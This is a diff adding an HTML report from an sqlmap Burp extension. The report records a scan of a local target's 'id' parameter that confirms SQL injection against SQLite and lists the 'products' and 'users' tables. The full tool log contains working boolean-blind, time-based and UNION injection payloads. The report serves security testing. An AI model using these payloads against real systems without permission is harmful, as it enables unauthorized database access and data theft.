@@ -1,0 +1,104 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>sqlmap report</title><style>body{font-family:system-ui,Segoe UI,Arial,sans-serif;margin:0;background:#0f1115;color:#e6e6e6}.wrap{max-width:1000px;margin:0 auto;padding:24px}h1{font-size:22px;margin:0 0 4px} .sub{color:#8a93a2;margin:0 0 20px}.badge{display:inline-block;padding:4px 12px;border-radius:14px;font-weight:600;font-size:13px}.vuln{background:#3a1113;color:#ff8a8a;border:1px solid #7a1f24}.clean{background:#0f2a17;color:#6ee7a0;border:1px solid #1f6a3a}table{border-collapse:collapse;width:100%;margin:12px 0}th,td{border:1px solid #262b35;padding:8px 10px;text-align:left;font-size:13px;vertical-align:top}th{background:#1a1f28;color:#b8c1cf}h2{font-size:16px;margin:24px 0 8px;border-bottom:1px solid #262b35;padding-bottom:6px}pre{background:#0a0c10;border:1px solid #262b35;border-radius:6px;padding:12px;overflow:auto;font-size:12px;line-height:1.4;max-height:520px}.k{color:#8a93a2}</style></head><body><div class="wrap"><h1>Standalone sqlmap — scan report</h1><p class="sub">Generated 2026-07-12 22:20:06</p><span class="badge vuln">SQL INJECTION CONFIRMED</span><h2>Target</h2><table><tr><th style="width:180px">URL</th><td>(unknown)</td></tr><tr><th style="width:180px">Method</th><td></td></tr><tr><th style="width:180px">Back-end DBMS</th><td>SQLite</td></tr><tr><th style="width:180px">Banner</th><td>3.45.1</td></tr><tr><th style="width:180px">sqlmap exit code</th><td>0</td></tr></table><h2>Injection points</h2><table><tr><th>Parameter</th><th>Type</th><th>Title</th></tr><tr><td>id</td><td>boolean-based blind</td><td>AND boolean-based blind - WHERE or HAVING clause</td></tr><tr><td>id</td><td>time-based blind</td><td>SQLite &gt; 2.0 AND time-based blind (heavy query)</td></tr><tr><td>id</td><td>UNION query</td><td>Generic UNION query (NULL) - 3 columns</td></tr></table><h2>Tables enumerated</h2><table><tr><td>products</td></tr><tr><td>users</td></tr></table><h2>Full sqlmap output</h2><pre>        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.10.7.104#dev}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:57:36 /2026-07-12/
+
+
+[21:57:36] [INFO] parsing HTTP request from 'C:/Users/chan/AppData/Local/Temp/claude/C--Users-chan-Documents-Claude-burp-sqlmap/8c486fac-014b-43d4-9528-adcd82f0f590/scratchpad/request.txt'
+
+[21:57:37] [WARNING] using 'C:\Users\chan\AppData\Local\Temp\claude\C--Users-chan-Documents-Claude-burp-sqlmap\8c486fac-014b-43d4-9528-adcd82f0f590\scratchpad\outT' as the output directory
+
+[21:57:37] [INFO] testing connection to the target URL
+
+[21:57:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+
+[21:57:37] [INFO] testing if the target URL content is stable
+
+[21:57:37] [INFO] target URL content is stable
+
+[21:57:37] [INFO] testing if GET parameter 'id' is dynamic
+
+[21:57:37] [INFO] GET parameter 'id' appears to be dynamic
+
+[21:57:37] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'SQLite')
+
+[21:57:37] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
+
+[21:57:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+
+[21:57:37] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=&quot;Widget&quot;)
+
+[21:57:37] [INFO] testing 'Generic inline queries'
+
+[21:57:37] [INFO] testing 'SQLite inline queries'
+
+[21:57:37] [INFO] testing 'SQLite &gt; 2.0 stacked queries (heavy query - comment)'
+[21:57:37] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)
+
+[21:57:37] [INFO] testing 'SQLite &gt; 2.0 stacked queries (heavy query)'
+
+[21:57:37] [INFO] testing 'SQLite &gt; 2.0 AND time-based blind (heavy query)'
+
+[21:57:40] [INFO] GET parameter 'id' appears to be 'SQLite &gt; 2.0 AND time-based blind (heavy query)' injectable 
+
+[21:57:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+
+[21:57:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+
+[21:57:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+
+[21:57:40] [INFO] target URL appears to have 3 columns in query
+
+[21:57:40] [WARNING] reflective value(s) found and filtering out
+
+[21:57:40] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5011=5011
+
+    Type: time-based blind
+    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 8487=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,106,120,106,113)||CHAR(67,86,106,90,112,90,90,68,78,85,89,103,108,85,119,65,114,82,87,73,115,90,121,77,87,76,117,115,102,122,107,120,84,104,79,72,98,98,65,74)||CHAR(113,107,120,107,113)-- zqmS
+---
+
+[21:57:40] [INFO] the back-end DBMS is SQLite
+
+[21:57:40] [INFO] fetching banner
+back-end DBMS: SQLite
+banner: '3.45.1'
+
+[21:57:40] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
+
+[21:57:40] [INFO] fetching tables for database: 'SQLite_masterdb'
+&lt;current&gt;
+[2 tables]
++----------+
+| products |
+| users    |
++----------+
+
+
+[21:57:40] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 9 times
+
+[21:57:40] [INFO] fetched data logged to text files under 'C:\Users\chan\AppData\Local\Temp\claude\C--Users-chan-Documents-Claude-burp-sqlmap\8c486fac-014b-43d4-9528-adcd82f0f590\scratchpad\outT\127.0.0.1'
+
+[*] ending @ 21:57:40 /2026-07-12/
+
+</pre><p class="k">Produced by the Standalone sqlmap Burp extension. sqlmap is the source of truth for all findings above.</p></div></body></html>
